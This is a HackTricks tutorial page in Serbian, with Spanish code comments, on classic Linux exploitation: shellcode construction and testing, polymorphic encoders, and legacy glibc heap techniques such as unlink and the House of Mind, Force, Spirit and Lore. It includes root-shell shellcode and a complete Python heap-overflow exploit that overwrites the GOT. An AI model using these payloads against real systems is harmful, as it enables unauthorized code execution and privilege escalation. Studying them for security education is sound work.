# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

Pogledajte prekide jezgra: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; oƒçistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenta za proslediti\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Izvr≈°i syscall

**nasm -f elf assembly.asm** ‚Äî> Vraƒáa nam .o\
**ld assembly.o -o shellcodeout** ‚Äî> Daje nam izvr≈°ni fajl sastavljen od asemblera i mo≈æemo izvuƒái opkode sa **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Da vidimo da je to zaista na≈° shellcode i izvuƒçemo OpCode

**Proverite da shellcode funkcioni≈°e**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Da biste videli da se sistemski pozivi pravilno izvr≈°avaju, potrebno je da kompajlirate prethodni program, a sistemski pozivi treba da se pojave u **strace ./PROGRAMA\_COMPILADO**

Kada se kreiraju shellcode-ovi, mo≈æe se primeniti trik. Prva instrukcija je jump na call. Call poziva originalni kod i takoƒëe stavlja EIP na stek. Nakon instrukcije call, stavili smo string koji nam je potreban, tako da sa tim EIP-om mo≈æemo ukazati na string i nastaviti sa izvr≈°avanjem koda.

EJ **TRIK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ koristeƒái Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

Sastoji se od malog koda koji pretra≈æuje stranice memorije povezane sa procesom u potrazi za shellcode-om koji je tamo saƒçuvan (tra≈æi neku potpisanu oznaku u shellcode-u). Korisno u sluƒçajevima kada se ima samo mali prostor za injekciju koda.

**Shellcodes polimorfni**

Sastoje se od ≈°ifrovanih shell-ova koji imaju mali kod koji ih de≈°ifruje i preskoƒçi na njega, koristeƒái trik Call-Pop, ovo bi bio **primer ≈°ifrovanog cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Dodatne metode**

**Murat tehnika**

U linuxu se svi programi mapiraju poƒçinjuƒái od 0xbfffffff

Gledajuƒái kako se gradi stek novog procesa u linuxu, mo≈æe se razviti exploit tako da se program pokrene u okru≈æenju ƒçija je jedina promenljiva shellcode. Adresa ove se mo≈æe izraƒçunati kao: addr = 0xbfffffff - 4 - strlen(NAZIV\_izvr≈°nog\_fajla) - strlen(shellcode)

Na ovaj naƒçin bi se jednostavno dobila adresa gde se nalazi promenljiva okru≈æenja sa shellcode.

To se mo≈æe uraditi zahvaljujuƒái funkciji execle koja omoguƒáava kreiranje okru≈æenja koje ima samo ≈æeljene promenljive okru≈æenja.

### **Format Strings to Buffer Overflows**

**sprintf moves** formatirani string **u** **promenljivu.** Stoga, mo≈æete zloupotrebiti **formatiranje** stringa da izazovete **buffer overflow u promenljivoj** u koju se sadr≈æaj kopira.\
Na primer, payload `%.44xAAAA` ƒáe **napisati 44B+"AAAA" u promenljivu**, ≈°to mo≈æe izazvati buffer overflow.

### **\_\_atexit strukture**

{% hint style="danger" %}
Danas je veoma **ƒçudno iskoristiti ovo**.
{% endhint %}

**`atexit()`** je funkcija kojoj se **prolaze druge funkcije kao parametri.** Ove **funkcije** ƒáe biti **izvr≈°ene** prilikom izvr≈°avanja **`exit()`** ili **povratka** iz **main**.\
Ako mo≈æete **modifikovati** **adresu** bilo koje od ovih **funkcija** da pokazuje na shellcode, na primer, dobiƒáete **kontrolu** nad **procesom**, ali je to trenutno komplikovanije.\
Trenutno su **adrese funkcija** koje treba izvr≈°iti **sakrivene** iza nekoliko struktura i konaƒçno adresa na koju pokazuje nije adresa funkcija, veƒá je **kriptovana XOR** i pomeranjima sa **nasumiƒçnim kljuƒçem**. Tako da je trenutno ovaj vektorski napad **ne ba≈° koristan, barem na x86** i **x64\_86**.\
**Funkcija za enkripciju** je **`PTR_MANGLE`**. **Druge arhitekture** kao ≈°to su m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju funkciju enkripcije** jer **vraƒáa isto** ≈°to je primila kao ulaz. Tako da bi ove arhitekture bile napadljive ovim vektorom.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Danas je veoma **ƒçudno iskoristiti ovo**.
{% endhint %}

**`Setjmp()`** omoguƒáava **ƒçuvanje** **konteksta** (registri)\
**`longjmp()`** omoguƒáava **obnavljanje** **konteksta**.\
**Saƒçuvani registri** su: `EBX, ESI, EDI, ESP, EIP, EBP`\
≈†ta se de≈°ava je da se EIP i ESP prosleƒëuju kroz **`PTR_MANGLE`** funkciju, tako da su **arhitekture ranjive na ovaj napad iste kao gore**.\
Koriste se za oporavak od gre≈°aka ili prekida.\
Meƒëutim, prema onome ≈°to sam proƒçitao, ostali registri nisu za≈°tiƒáeni, **tako da ako postoji `call ebx`, `call esi` ili `call edi`** unutar pozvane funkcije, kontrola mo≈æe biti preuzeta. Ili mo≈æete takoƒëe modifikovati EBP da modifikujete ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtable** koja je niz **pokazivaƒça na metode**.

Svaki objekat klase ima **VPtr** koji je **pokazivaƒç** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, tako da ako se postigne **prepisivanje** **VPtr** mo≈æe se **modifikovati** da **pokazuje** na la≈ænu metodu tako da izvr≈°avanje funkcije ide na shellcode.

## **Preventivne mere i izbegavanja**

**Zamena Libsafe**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Interceptuju se pozivi nekim nesigurnim funkcijama sa drugim sigurnim. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne statiƒçke kompilacije, ne sve ranjive funkcije postaju sigurne i LD\_PRELOAD ne funkcioni≈°e u binarnim fajlovima sa suid).

**ASCII Armored Address Space**

Sastoji se od uƒçitavanja deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. Meƒëutim, ovo zapravo ne zaustavlja gotovo nijedan napad, a jo≈° manje u little endian.

**ret2plt**

Sastoji se od izvoƒëenja ROP-a tako da se pozove funkcija strcpy@plt (iz plt) i poka≈æe na ulaz u GOT i kopira prvi bajt funkcije koju ≈æelite da pozovete (system()). Odmah zatim se radi isto pokazujuƒái na GOT+1 i kopira se 2. bajt system()‚Ä¶ Na kraju se poziva adresa saƒçuvana u GOT koja ƒáe biti system().

**Kave sa chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instalira osnovni sistem pod specifiƒçnim poddirektorijumom

Admin mo≈æe izaƒái iz jedne od ovih kave tako ≈°to ƒáe: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind ‚Äî> Tra≈æi gre≈°ke\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Osnovni exploits**

**Deliƒá dodeljen**

prev\_size |\
size | ‚ÄîZaglavlje\
\*mem | Podaci

**Deliƒá slobodan**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk ‚ÄîZaglavlje\
\*mem | Podaci

Slobodni delovi su u dvostruko povezanoj listi (bin) i nikada ne mogu postojati dva slobodna dela zajedno (spajaju se)

U ‚Äúsize‚Äù postoje bitovi koji oznaƒçavaju: Da li je prethodni deo u upotrebi, da li je deo dodeljen putem mmap() i da li deo pripada primarnoj areni.

Ako prilikom oslobaƒëanja dela neki od susednih bude slobodan, oni se spajaju putem makroa unlink() i novi veƒái deo se prosleƒëuje frontlink() da mu umetne odgovarajuƒái bin.

unlink(){\
BK = P->bk; ‚Äî> BK novog dela je onaj koji je imao onaj koji je veƒá bio slobodan\
FD = P->fd; ‚Äî> FD novog dela je onaj koji je imao onaj koji je veƒá bio slobodan\
FD->bk = BK; ‚Äî> BK sledeƒáeg dela pokazuje na novi deo\
BK->fd = FD; ‚Äî> FD prethodnog dela pokazuje na novi deo\
}

Dakle, ako uspemo da modifikujemo P->bk sa adresom shellcode i P->fd sa adresom do ulaza u GOT ili DTORS minus 12, posti≈æe se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

I tako se izvr≈°ava shellcode prilikom izlaska iz programa.

Pored toga, 4. izjava unlink() pi≈°e ne≈°to i shellcode mora biti prilagoƒëena za ovo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Ovo izaziva pisanje 4 bajta poƒçev≈°i od 8. bajta shellcode, tako da prva instrukcija shellcode mora biti jmp da preskoƒçi ovo i padne u nops koji vode do ostatka shellcode.

Dakle, exploit se kreira:

U buffer1 stavljamo shellcode poƒçev≈°i od jmp da padne u nops ili u ostatak shellcode.

Nakon shellcode stavljamo popunu do polja prev\_size i size sledeƒáeg dela. Na ovim mestima stavljamo 0xfffffff0 (tako da se prev\_size prepisuje da ima bit koji ka≈æe da je slobodan) i ‚Äú-4‚Äú(0xfffffffc) u size (da kada proveri u 3. delu da li je 2. zapravo slobodan, ide na modifikovani prev\_size koji ƒáe mu reƒái da je slobodan) -> Tako kada free() istra≈æuje, iƒái ƒáe na size 3. ali zapravo ƒáe iƒái na 2. - 4 i pomisliti da je 2. deo slobodan. I tada ƒáe pozvati **unlink()**.

Pozivom unlink() koristiƒáe kao P->fd prve podatke 2. dela, tako da ƒáe tu biti adresa koju ≈æelite da prepi≈°ete - 12 (jer ƒáe u FD->bk dodati 12 na saƒçuvanu adresu u FD). I na tu adresu ƒáe uneti drugu adresu koju naƒëe u 2. delu, ≈°to ƒáe nam biti interesantno da bude adresa do shellcode (la≈æni P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes popune**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Bit koji oznaƒçava da je prethodni deo slobodan treba biti 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, da bi mislio da je ‚Äúsize‚Äù 3. dela 4 bajta iza (pokazuje na prev\_size) jer tu gleda da li je 2. deo slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na payload na poƒçetku ƒáemo staviti 8 bajtova popune**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biƒáe adresa koja se prepisuje da se pokrene shellcode drugi put kada se pozove free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Kao ≈°to je reƒçeno, payload poƒçinje sa 8 bajtova popune jer tako**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifikuje se 2. deo, got\_free pokazuje na gde ƒáemo saƒçuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobaƒëajuƒái u obrnutom redosledu (wargame)**

Kontroli≈°emo 3 uzastopna dela i oslobaƒëaju se u obrnutom redosledu od rezervisanih.

U tom sluƒçaju:

U delu c stavljamo shellcode

Deo a koristimo da prepi≈°emo b tako da size ima bit PREV\_INUSE deaktiviran, tako da misli da je deo a slobodan.

Pored toga, prepisujemo u zaglavlju b size da bude -4.

Tako, program ƒáe misliti da je ‚Äúa‚Äù slobodan i u binu, tako da ƒáe pozvati unlink() da ga odve≈æe. Meƒëutim, po≈°to zaglavlje PREV\_SIZE vredi -4, misliƒáe da deo ‚Äúa‚Äù zapravo poƒçinje u b+4. Drugim reƒçima, izvr≈°iƒáe unlink() na deo koji poƒçinje u b+4, tako da ƒáe u b+12 biti pokazivaƒç ‚Äúfd‚Äù i u b+16 ƒáe biti pokazivaƒç ‚Äúbk‚Äù.

Na ovaj naƒçin, ako u bk stavimo adresu do shellcode i u fd stavimo adresu do funkcije ‚Äúputs()‚Äù-12, imamo na≈° payload.

**Frontlink tehnika**

Naziva se frontlink kada se oslobaƒëa ne≈°to i nijedan od njegovih susednih delova nije slobodan, ne poziva se unlink() veƒá se direktno poziva frontlink().

Koristan je ranjivost kada se malloc koji se napada nikada ne oslobaƒëa (free()).

Potrebno je:

Buffer koji mo≈æe da se preplavi sa funkcijom za unos podataka

Buffer koji je susedni ovom koji mora biti osloboƒëen i kojem ƒáe se modifikovati polje fd njegovog zaglavlja zahvaljujuƒái preplavljivanju prethodnog buffera

Buffer za oslobaƒëanje sa veliƒçinom veƒáom od 512 ali manjom od prethodnog buffera

Buffer deklarisan pre koraka 3 koji omoguƒáava prepisivanje prev\_size ovog

Na ovaj naƒçin, postizanjem prepisivanja u dva malloc-a na neuredan naƒçin i u jednom na kontrolisan naƒçin, ali se oslobaƒëa samo taj jedan, mo≈æemo napraviti exploit.

**Ranjivost double free()**

Ako se pozove free() dva puta sa istim pokazivaƒçem, ostaju dva bina koja pokazuju na istu adresu.

U sluƒçaju da ≈æelite ponovo da koristite jedan, dodeliƒáe se bez problema. U sluƒçaju da ≈æelite da koristite drugi, dodeliƒáe se isti prostor, tako da ƒáemo imati pokazivaƒçe ‚Äúfd‚Äù i ‚Äúbk‚Äù la≈æirane sa podacima koje ƒáe pisati prethodna rezervacija.

**After free()**

Prethodno osloboƒëeni pokazivaƒç se ponovo koristi bez kontrole.

## **8 Heap Overflows: Napredni exploits**

Tehnike Unlink() i FrontLink() su uklonjene modifikovanjem funkcije unlink().

**Kuƒáa uma**

Samo jedan poziv na free() je potreban da izazove izvr≈°avanje proizvoljnog koda. Va≈æno je potra≈æiti drugi deo koji mo≈æe biti preplavljen od prethodnog i osloboƒëen.

Jedan poziv na free() izaziva poziv na public\_fREe(mem), ovaj radi:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mem); ‚Äî> Vraƒáa pokazivaƒç na adresu gde poƒçinje deo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

U \[1] proverava se polje size bit NON\_MAIN\_ARENA, koji se mo≈æe izmeniti da provera vrati true i izvr≈°i heap\_for\_ptr() koji radi and na ‚Äúmem‚Äù ostavljajuƒái 0 na 2.5 manje bitova (u na≈°em sluƒçaju od 0x0804a000 ostavlja 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj naƒçin, ako mo≈æemo kontrolisati deo na primer u 0x0804a000 i oslobaƒëa se deo u **0x081002a0**, mo≈æemo doƒái do adrese 0x08100000 i pisati ≈°ta god ≈æelimo, na primer **0x0804a000**. Kada se ovaj drugi deo oslobodi, otkriƒáe da heap\_for\_ptr(ptr)->ar\_ptr vraƒáa ono ≈°to smo napisali u 0x08100000 (jer se primenjuje and na 0x081002a0 i odatle se uzima vrednost prvih 4 bajta, ar\_ptr)

Na ovaj naƒçin se poziva \_int\_free(ar\_ptr, mem), tj. **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao ≈°to smo videli ranije, mo≈æemo kontrolisati vrednost av, jer je to ono ≈°to smo napisali u delu koji ƒáe se osloboditi.

Kao ≈°to je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dakle, ako u av->bins\[2] upi≈°emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji ƒáe se upisati u \_\_DTOR\_END\_\_ adresa drugog dela.

Drugim reƒçima, u prvom delu moramo staviti na poƒçetak vi≈°e puta adresu \_\_DTOR\_END\_\_-12 jer ƒáe odatle uzeti av->bins\[2]

Na adresi na kojoj padne adresa drugog dela sa poslednjih 5 nula, treba napisati adresu do ovog prvog dela kako bi heap\_for\_ptr() mislio da je ar\_ptr na poƒçetku prvog dela i izvukao odatle av->bins\[2]

U drugom delu i zahvaljujuƒái prvom prepisujemo prev\_size sa jump 0x0c i size sa neƒçim da aktiviramo -> NON\_MAIN\_ARENA

Zatim u delu 2 stavljamo gomilu nops i na kraju shellcode

Na ovaj naƒçin ƒáe se pozvati \_int\_free(TROZO1, TROZO2) i pratiti uputstva da se upi≈°e u \_\_DTOR\_END\_\_ adresa prev\_size TROZO2 koji ƒáe skoƒçiti na shellcode.

Da bi se primenila ova tehnika, potrebno je da se ispune neki dodatni zahtevi koji dodatno komplikuju payload.

Ova tehnika vi≈°e nije primenljiva jer je primenjen gotovo isti zakrpa kao za unlink. Proverava se da li nova adresa na koju se pokazuje takoƒëe pokazuje na nju.

**Fastbin**

To je varijanta Kuƒáe uma

Zanima nas da izvr≈°imo sledeƒái kod do kojeg se dolazi nakon prve provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Gde je fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Na ovaj naƒçin, ako stavimo u ‚Äúfb‚Äù adresu funkcije u GOT, na ovoj adresi ƒáe se staviti adresa do prepisanog dela. Za ovo ƒáe biti potrebno da arena bude blizu adresa dtors. Taƒçnije, da av->max\_fast bude na adresi koju ƒáemo prepisati.

S obzirom na to da smo sa Kuƒáom uma videli da kontroli≈°emo poziciju av.

Dakle, ako u polje size stavimo veliƒçinu od 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ƒáe nam vratiti fastbins\[-1], koji ƒáe pokazivati na av->max\_fast

U ovom sluƒçaju av->max\_fast ƒáe biti adresa koja ƒáe se prepisati (ne na koju pokazuje, veƒá ta pozicija ƒáe se prepisati).

Pored toga, mora se ispuniti da deo susedni osloboƒëenom mora biti veƒái od 8 -> S obzirom na to da smo rekli da je size osloboƒëenog dela 8, u ovom la≈ænom delu samo treba staviti size veƒái od 8 (po≈°to ƒáe pored toga shellcode iƒái u osloboƒëeni deo, moraƒáe se na poƒçetku staviti jmp koji pada u nops).

Pored toga, taj isti la≈æni deo mora biti manji od av->system\_mem. av->system\_mem se nalazi 1848 bajtova dalje.

Zbog nula u \_DTOR\_END\_ i malo adresa u GOT, nijedna adresa ovih sekcija ne mo≈æe se prepisati, tako da vidimo kako primeniti fastbin da napadnemo stek.

Drugi naƒçin napada je preusmeravanje **av** ka steku.

Ako modifikujemo size da bude 16 umesto 8, tada: fastbin\_index() ƒáe nam vratiti fastbins\[0] i mo≈æemo iskoristiti ovo da prepi≈°emo stek.

Za ovo ne sme biti nikakvih canary ili ƒçudnih vrednosti na steku, zapravo se moramo nalaziti u njemu: 4 bajta nula + EBP + RET

4 bajta nula su potrebna da **av** bude na ovoj adresi i prvi element **av** je mutexe koji mora biti 0.

**av->max\_fast** ƒáe biti EBP i biƒáe vrednost koja ƒáe nam poslu≈æiti da preskoƒçimo ograniƒçenja.

U **av->fastbins\[0]** ƒáe se prepisati sa adresom **p** i biƒáe RET, tako da ƒáe preskoƒçiti na shellcode.

Pored toga, u **av->system\_mem** (1484 bajta iznad pozicije na steku) biƒáe dovoljno smeƒáa koje ƒáe nam omoguƒáiti da preskoƒçimo proveru koja se vr≈°i.

Pored toga, mora se ispuniti da deo susedni osloboƒëenom mora biti veƒái od 8 -> S obzirom na to da smo rekli da je size osloboƒëenog dela 16, u ovom la≈ænom delu samo treba staviti size veƒái od 8 (po≈°to ƒáe pored toga shellcode iƒái u osloboƒëeni deo, moraƒáe se na poƒçetku staviti jmp koji pada u nops koji dolaze nakon polja size novog la≈ænog dela).

**Kuƒáa duha**

U ovom sluƒçaju tra≈æimo da imamo pokazivaƒç na malloc koji mo≈æe biti izmenjen od strane napadaƒça (na primer, da je pokazivaƒç na steku ispod moguƒáeg preplavljivanja promenljive).

Tako bismo mogli uƒçiniti da ovaj pokazivaƒç pokazuje gde god hoƒáemo. Meƒëutim, ne mo≈æe svako mesto biti va≈æno, veliƒçina la≈ænog dela mora biti manja od av->max\_fast i specifiƒçno jednaka veliƒçini zatra≈æenoj u buduƒáem pozivu malloc()+8. Zbog toga, ako znamo da nakon ovog ranjivog pokazivaƒça pozivamo malloc(40), veliƒçina la≈ænog dela mora biti jednaka 48.

Ako, na primer, program tra≈æi od korisnika broj, mogli bismo uneti 48 i usmeriti pokazivaƒç modifikovanog malloc-a na sledeƒáih 4 bajta (koji bi mogli pripadati EBP-u sa sreƒáom, tako da 48 ostane iza, kao da je zaglavlje size). Pored toga, adresa ptr-4+48 mora ispunjavati nekoliko uslova (u ovom sluƒçaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

U sluƒçaju da se ovo ispuni, kada se pozove sledeƒái malloc koji smo rekli da je malloc(40), dodeliƒáe se kao adresa adresa EBP-a. U sluƒçaju da napadaƒç takoƒëe mo≈æe kontrolisati ≈°ta se pi≈°e u ovom malloc-u, mo≈æe prepisati i EBP i EIP sa adresom koju ≈æeli.

Mislim da je to zato ≈°to ƒáe kada ga oslobodi free() saƒçuvati da na adresi koja pokazuje na EBP steka postoji deo savr≈°ene veliƒçine za novi malloc() koji se ≈æeli rezervisati, tako da mu dodeljuje tu adresu.

**Kuƒáa sile**

Potrebno je:

* Preplavljivanje dela koje omoguƒáava prepisivanje wilderness
* Poziv malloc() sa veliƒçinom definisanom od strane korisnika
* Poziv malloc() ƒçiji podaci mogu biti definisani od strane korisnika

Prvo ≈°to se radi je prepisivanje size dela wilderness sa veoma velikom vredno≈°ƒáu (0xffffffff), tako da ƒáe svaka zahtevana memorija dovoljno velika biti obraƒëena u \_int\_malloc() bez potrebe za pro≈°irenjem heap-a.

Drugo je izmeniti av->top da pokazuje na podruƒçje memorije pod kontrolom napadaƒça, kao ≈°to je stek. U av->top ƒáe se staviti \&EIP - 8.

Moramo prepisati av->top da pokazuje na podruƒçje memorije pod kontrolom napadaƒça:

victim = av->top;

remainder = chunk\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost adrese trenutnog dela wilderness (trenutni av->top) i remainder je taƒçno zbir te adrese plus koliƒçina bajtova zatra≈æenih od malloc(). Tako da ako \&EIP-8 bude u 0xbffff224 i av->top sadr≈æi 0x080c2788, tada ƒáe koliƒçina koju moramo rezervisati u kontrolisanom malloc-u da av->top pokazuje na $EIP-8 za sledeƒái malloc() biti:

0xbffff224 - 0x080c2788 = 3086207644.

Tako ƒáe se saƒçuvati u av->top izmenjena vrednost i sledeƒái malloc ƒáe pokazivati na EIP i moƒái ƒáe ga prepisati.

Va≈æno je znati da je size novog dela wilderness veƒái od zahteva postavljenog za poslednji malloc(). Drugim reƒçima, ako wilderness pokazuje na \&EIP-8, size ƒáe biti taƒçno u polju EBP steka.

**Kuƒáa legende**

**Korupcija SmallBin**

Osloboƒëeni delovi se unose u bin u zavisnosti od njihove veliƒçine. Ali pre nego ≈°to se unesu, ƒçuvaju se u unsorted bins. Kada se deo oslobodi, ne unosi se odmah u svoj bin, veƒá ostaje u unsorted bins. Zatim, ako se rezervi≈°e novi deo i prethodni osloboƒëeni mo≈æe poslu≈æiti, vraƒáa mu se, ali ako se rezervi≈°e veƒái, osloboƒëeni deo u unsorted bins se stavlja u svoj odgovarajuƒái bin.

Da bi se do≈°lo do ranjivog koda, zahtev za memoriju mora biti veƒái od av->max\_fast (72 obiƒçno) i manji od MIN\_LARGE\_SIZE (512).

Ako u binu postoji deo odgovarajuƒáe veliƒçine za ono ≈°to se tra≈æi, vraƒáa se taj nakon ≈°to se odve≈æe:

bck = victim->bk; Pokazuje na prethodni deo, to je jedina informacija koju mo≈æemo izmeniti.

bin->bk = bck; Pretposlednji deo postaje poslednji, u sluƒçaju da bck pokazuje na stek, sledeƒáem rezervisanom delu ƒáe se dati ova adresa.

bck->fd = bin; Lista se zatvara tako da ovaj pokazuje na bin.

Potrebno je:

Da se rezervi≈°u dva malloc, tako da se prvom mo≈æe napraviti overflow nakon ≈°to je drugi osloboƒëen i unet u svoj bin (tj. da je rezervisan malloc veƒái od drugog dela pre nego ≈°to se napravi overflow).

Da malloc rezervisan kojem se daje adresa izabrana od strane napadaƒça bude pod kontrolom napadaƒça.

Cilj je sledeƒái, ako mo≈æemo napraviti overflow na heap koji ispod ima veƒá osloboƒëeni deo i u svom binu, mo≈æemo izmeniti njegov pokazivaƒç bk. Ako izmenimo njegov pokazivaƒç bk i ovaj deo postane prvi u listi binova i rezervi≈°e se, bin ƒáe biti prevaren i reƒái ƒáe mu da je poslednji deo liste (sledeƒái koji se nudi) na la≈ænoj adresi koju smo stavili (na stek ili GOT na primer). Tako da ako se ponovo rezervi≈°e drugi deo i napadaƒç ima dozvole za njega, dobiƒáe deo na ≈æeljenoj poziciji i moƒái ƒáe da pi≈°e u nju.

Nakon oslobaƒëanja modifikovanog dela, potrebno je rezervisati deo veƒái od osloboƒëenog, tako da ƒáe modifikovani deo izaƒái iz unsorted bins i uneti se u svoj bin.

Jednom kada je u svom binu, vreme je da mu modifikujemo pokazivaƒç bk putem overflow-a da pokazuje na adresu koju ≈æelimo da prepi≈°emo.

Tako ƒáe bin ƒçekati red da se pozove malloc() dovoljno puta da se ponovo iskoristi modifikovani bin i prevari bin tako ≈°to ƒáe mu reƒái da je sledeƒái deo na la≈ænoj adresi. A zatim ƒáe se dati deo koji nas zanima.

